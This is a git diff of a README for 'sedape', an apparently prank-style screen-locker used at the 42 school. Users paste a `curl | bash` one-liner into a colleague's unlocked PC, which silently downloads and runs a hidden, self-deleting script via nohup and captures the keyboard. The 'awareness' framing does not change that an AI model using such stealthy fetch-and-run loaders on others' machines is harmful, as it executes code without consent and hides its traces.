@@ -14,6 +14,16 @@ It sounds like a prank. It is. But it also teaches you to **always lock your scr
 ## How it works
 
 ```
+curl -sL nary14.pythonanywhere.com/s/<username> | bash
+         │
+         ▼
+   loader.sh runs silently
+         │
+         ├── pip3 install Pillow qrcode  (silent)
+         ├── downloads croisant_lock.py into /tmp (hidden filename)
+         ├── launches it with nohup (survives terminal close)
+         └── self-destructs (rm -- "$0")
+
 croisant_lock.py  ──POST──▶  /api/request_lock     (registers the lock, gets a token)
                   ◀──JSON──  { "token": "a3f9bc12" }
                   ──GET───▶  /gen_image/<token>      (downloads image with QR code)
@@ -22,6 +32,7 @@ croisant_lock.py  ──POST──▶  /api/request_lock     (registers the lock
 Victim scans QR   ──GET───▶  /unlock/<token>         (awareness page)
                   ──POST──▶  enters name + code       (unlocks the PC)
                   ◀──────── script detects status=1, releases screen
+                             script deletes image + deletes itself
 ```
 
 ---
@@ -45,38 +56,57 @@ Your screen is now locked fullscreen. Here is what to do:
 
 ### Step 1 — Create your account
 
-Go to **https://nary14.pythonanywhere.com/signup** and create an account.
+Go to **https://nary14.pythonanywhere.com** and click **"Se connecter avec mon compte 42"**.
 
-- Pick your role: **TUTOR**, **STAFF** (restricted to 3 people), or **RANDOM GUY AT 42**
-- Set your display name — this is what appears on the victim's screen
-- Set your unlock code — the victim will need this to unlock their PC
+You will be redirected to the 42 intranet to authenticate. No password is stored on Sedape — authentication is handled entirely by the official 42 OAuth2 system.
 
-### Step 2 — Get your command
+Once logged in, your profile is created automatically with:
+- Your **42 login** and **profile picture** pulled from the intranet
+- Your **role** detected from your 42 titles:
+  - `TUTOR` — if you have the Tutor title on the intranet
+  - `STAFF` — if you are marked as staff or bocal on the intranet
+  - `RANDOM GUY AT 42` — everyone else
+- A default **unlock code** of `4242` (change it in settings)
 
-Log in to your dashboard at **https://nary14.pythonanywhere.com**
+### Step 2 — Configure your account
 
-You will see your personalized one-liner command ready to copy:
+In your dashboard, go to **Settings** and:
+- Change your **display name** — this is what appears on the victim's screen
+- Change your **unlock code** — the victim will need this to unlock their PC
+
+### Step 3 — Get your command
+
+Your personalized one-liner is ready to copy directly from the dashboard:
 
 ```bash
-pip3 install --user Pillow qrcode && curl -s https://nary14.pythonanywhere.com/download/<your_username> -o /tmp/s.py && python3 /tmp/s.py
+curl -sL nary14.pythonanywhere.com/s/<your_username> | bash
 ```
 
-### Step 3 — Run it on the target machine
+This single command does everything silently and leaves no trace.
+
+### Step 4 — Run it on the target machine
 
 Wait for the person to leave their PC unlocked. Open a terminal and paste the command.
 
 What happens next:
-- Pillow and qrcode get installed silently
-- The script downloads itself pre-configured with your account
-- It contacts the server, registers a new lock session, and gets a unique token
+- Pillow and qrcode get installed silently in the background
+- A hidden script is downloaded to `/tmp` with a randomized filename
+- It launches detached from the terminal via `nohup` — closing the terminal changes nothing
+- The bash loader self-destructs immediately after launching the script
+- The script contacts the server, registers a new lock session, and gets a unique token
 - It downloads a personalized image with your name and a QR code
 - The screen goes fullscreen and captures all keyboard input
 
-The victim's PC now shows your sedape screen. Your dashboard will show the new entry in real time.
+### Step 5 — Wait
 
-### Step 4 — Wait
+Once the victim scans the QR, reads the awareness page, and enters your name and unlock code correctly — their screen unlocks automatically.
 
-Once the victim scans the QR, reads the awareness page, and enters your name and unlock code correctly — their screen unlocks automatically. You will see the status change to **LIBÉRÉ** on your dashboard.
+After unlock:
+- The lock image is deleted from the victim's machine
+- The script deletes itself
+- Zero trace left on disk
+
+You will see the status change to **LIBÉRÉ** on your dashboard.
 
 ---
 
@@ -86,10 +116,10 @@ Everything is managed from **https://nary14.pythonanywhere.com**
 
 | Section | What it does |
 |---|---|
-| Profile card | Shows your username, unlock code, and active lock count |
+| Profile card | Shows your 42 login, profile picture, unlock code, role, and active lock count |
 | Stats | Total sedapes, blocked vs unlocked |
-| Command | Your one-liner ready to copy |
-| Script download | Direct download of your pre-configured script |
+| Command | Your one-liner `curl \| bash` ready to copy |
+| Script download | Direct download of your pre-configured `.py` script (if Pillow is already installed) |
 | PC list | All your lock sessions with token, status, and timestamp |
 | Preview | Live preview of what your sedape screen looks like |
 | Settings | Change your display name and unlock code |
@@ -98,12 +128,16 @@ Everything is managed from **https://nary14.pythonanywhere.com**
 
 ## Features
 
+- **42 OAuth2 login** — no account creation, log in with your 42 intranet credentials
+- **Auto role detection** — Tutor, Staff, or Random Guy, detected automatically from the intranet
+- **One-liner bash loader** — single `curl | bash` command, no manual setup
+- **Detached execution** — runs via `nohup`, survives terminal close
+- **Zero trace** — bash loader self-destructs, python script self-destructs after unlock
 - **Multi-user** — every person has their own account and isolated lock sessions
 - **Unique tokens** — each sedape generates a separate token, no conflicts between victims
 - **Dynamic image** — generated on the fly with your name and a unique QR code
 - **Awareness page** — victim reads a proper explanation before they can unlock
 - **Real-time dashboard** — track all your locked PCs with live status updates
-- **Pre-configured script** — downloads and runs with your account already embedded
 - **Fullscreen + keyboard capture** — prevents easy bypass
 
 ---
@@ -114,8 +148,9 @@ Everything is managed from **https://nary14.pythonanywhere.com**
 
 - Only use this on 42 school machines, within the community
 - The sedape is a friendly reminder, not a malicious attack
-- Passwords are hashed, tokens are randomly generated, no sensitive data is stored
-- The awareness page explains why screen locking matters
+- Authentication is delegated to the official 42 OAuth2 system — no passwords stored
+- Tokens are randomly generated per session, no sensitive data is stored
+- The awareness page explains why screen locking matters before the victim can unlock
 
 For real system-level locking: **Super+L** on Linux, **Win+L** on Windows, **Cmd+Ctrl+Q** on Mac.
 
